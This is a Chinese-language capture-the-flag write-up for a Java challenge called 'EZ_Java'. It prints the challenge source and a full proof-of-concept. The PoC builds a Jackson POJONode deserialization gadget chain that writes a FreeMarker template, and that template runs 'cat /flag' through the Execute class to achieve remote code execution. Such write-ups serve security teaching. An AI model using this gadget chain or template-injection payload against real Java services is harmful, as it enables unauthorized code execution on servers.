# EZ_Java

本地没有环境,所以就解析一下大佬的`PoC`​

先放几段比较关键的源码

​`ycbjava.Bean.HtmlBean`​

```java
public class HtmlBean implements Serializable {
  public Map HtmlMap;
  
  public String filename;
  
  public String content;
  
  public HtmlBean(HtmlMap htmlMap, String filename, String content) {
    this.HtmlMap = (Map)htmlMap;
    this.filename = filename;
    this.content = content;
  }
  
  public HtmlBean() {}
  
  public Map getHtmlMap() {
    this.HtmlMap.put(this.filename, this.content);
    return this.HtmlMap;
  }
/..../
}
```

​`ycbjava.Contorller.IndexController`​

```java
@Controller
public class IndexController {
  @RequestMapping({"/"})
  @ResponseBody
  public String index() {
    return "Welcome to YCB";
  }
  
  @RequestMapping({"/templating"})
  public String templating(@RequestParam String name, Model model) {
    model.addAttribute("name", name);
    return "index";
  }
  
  @RequestMapping({"/getflag"})
  @ResponseBody
  public String getflag(@RequestParam String data) throws IOException, ClassNotFoundException {
    byte[] decode = Base64.getDecoder().decode(data);
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    byteArrayOutputStream.write(decode);
    NewObjectInputStream objectInputStream = new NewObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
    objectInputStream.readObject();
    return "Success";
  }
}
```

​`ycbjava.Utils`​

```java
public class HtmlInvocationHandler implements InvocationHandler, Serializable {
  public Map obj;
  
  public HtmlInvocationHandler() {}
  
  public HtmlInvocationHandler(Map obj) {
    this.obj = obj;
  }
  
  public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
    Object result = this.obj.get(method.getName());
    return result;
  }
}
```

```java
 public class HtmlMap implements Map, Serializable { 
	public Object get(Object key) {
    Object obj;
    try {
      obj = Boolean.valueOf(HtmlUploadUtil.uploadfile(this.filename, this.content));
    } catch (Exception e) {
      throw new RuntimeException(e);
    } 
    return obj;
  }
}
```

```java
public class HtmlUploadUtil {
  public static boolean uploadfile(String filename, String content) {
    if (filename != null && !filename.endsWith(".ftl"))
      return false; 
    String realPath = "/app/templates/" + filename;
    if (realPath.contains("../") || realPath.contains("..\\"))
      return false; 
    try {
      BufferedWriter writer = new BufferedWriter(new FileWriter(realPath));
      writer.write(content);
      writer.close();
      return true;
    } catch (IOException e) {
      System.err.println("Error uploading file: " + e.getMessage());
      return false;
    } 
  }
}
```

```java
public class NewObjectInputStream extends ObjectInputStream {
  private static final Set<String> BLACKLISTED_CLASSES = new HashSet<>();
  
  static {
    BLACKLISTED_CLASSES.add("java.lang.Runtime");
    BLACKLISTED_CLASSES.add("java.lang.ProcessBuilder");
    BLACKLISTED_CLASSES.add("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
    BLACKLISTED_CLASSES.add("java.security.SignedObject");
    BLACKLISTED_CLASSES.add("com.sun.jndi.ldap.LdapAttribute");
  }
  
  public NewObjectInputStream(InputStream inputStream) throws IOException {
    super(inputStream);
  }
  
  protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
    if (BLACKLISTED_CLASSES.contains(desc.getName()))
      throw new SecurityException("Class not allowed: " + desc.getName()); 
    return super.resolveClass(desc);
  }
}
```

首先我们来看到`IndexController`​,有三条路由

​`/templating`​很明显就是模板渲染,可以传递一个`name`​参数

​`/getflag`​也很明显允许我们传递一段`base64`​编码的序列化数据,并且将它反序列化

因为这里的黑名单过滤的其实还算比较严格的,所以我们先按照题目预期的思路进行解决

我们可以看到`ycbjava.Utils.HtmlUploadUtil`​

这里定义了一个`uploadfile()`​方法,接受`filename`​和`content`​两个`String`​参数

只能传入`filename`​后缀为`ftl`​的文件,指定到`/app/templates/`​目录下

但是我们正常情况下是调用不了这个方法,只能够通过给的`/getflag`​路由,通过反序列化传入一个恶意的`ftl`​文件,再通过`/templating`​路由来调用

那我们就需要找到什么地方调用了这个`uploadfile()`​方法,我们可以发现在`HtmlMap`​中有一个`get()`​方法,这个`get()`​方法调用了`uploadfile()`​方法

继续往上走,看看有哪个地方调用了`get()`​方法,直接`find usage`​有则多地方,所以就直接在`Utils`​目录下找,可以发现`HtmlInvocationHandler`​中的`invoke()`​方法调用了`get()`​

而`HtmlInvocationHandler`​是一个动态代理类,动态代理类的一个特性就是动态代理类会自动执行动态代理类中的`invoke()`​方法

所以我们需要调用一处`HtmlInvocationHandler`​代理的类的任意方法来让他调用`invoke()`​方法,也就是`HtmlBean`​中的`getHtmlMap()`​方法,因为这个方法调用了`HtmlMap.put()`​

那么我们如何调用到这个方法呢,就要用到`jackson链`​了

需要用到`POJONode`​的`toString()`​方法来出发任意类的`getter()`​方法

至于`POJOnode`​类如何通过`toString()`​方法调用任意类的`getter()`​方法参考这篇文章[`https://xz.aliyun.com/t/12509`](https://xz.aliyun.com/t/12509)​

简述就是

```java
通过父类BaseJsonNode的toString()方法
toString -> InternalNodeMapper#nodeToString -> ObjectWriter.writeValueAsString
然后通过ObjectWriter.writeValueAsString去调用任意类的getter()
```

所以我们只需要把`Ezjava`​的后半段和`jackson链`​的前半段结合就好了

```java
 
import com.fasterxml.jackson.databind.node.POJONode;
import com.fasterxml.jackson.databind.node.BaseJsonNode;
import com.ycbjava.Bean.HtmlBean;
import com.ycbjava.Utils.HtmlInvocationHandler;
import com.ycbjava.Utils.HtmlMap;
import javassist.*;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.Map;
 
public class Poc {
 
    public static void main(String[] args) throws Exception {
        HtmlMap htmlMap = new HtmlMap();
        String filname = "index.ftl";
        String content = "<#assign ac=springMacroRequestContext.webApplicationContext>\n" +
                "  <#assign fc=ac.getBean('freeMarkerConfiguration')>\n" +
                "    <#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>\n" +
                "      <#assign VOID=fc.setNewBuiltinClassResolver(dcr)>${\"freemarker.template.utility.Execute\"?new()(\"cat /flag\")}";
        setFieldValue(htmlMap, "filename", filname);
        setFieldValue(htmlMap, "content", content);
        HtmlInvocationHandler htmlInvocationHandler = new HtmlInvocationHandler(htmlMap);
        Map map = (Map) Proxy.newProxyInstance(
                HtmlMap.class.getClassLoader(),
                new Class[] {Map.class},
                htmlInvocationHandler);
        HtmlBean htmlBean = new HtmlBean();
        setFieldValue(htmlBean, "HtmlMap", map);
 
        POJONode jsonNodes = new POJONode(htmlBean);
        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp,jsonNodes);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(exp);
        objectOutputStream.close();
        String res = Base64.getEncoder().encodeToString(barr.toByteArray());
        System.out.println(res);
 
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
```

参考链接:

[https://jbnrz.com.cn/index.php/2023/09/03/ycb2023/](https://jbnrz.com.cn/index.php/2023/09/03/ycb2023/)

[https://xz.aliyun.com/t/12509](https://xz.aliyun.com/t/12509)

‍
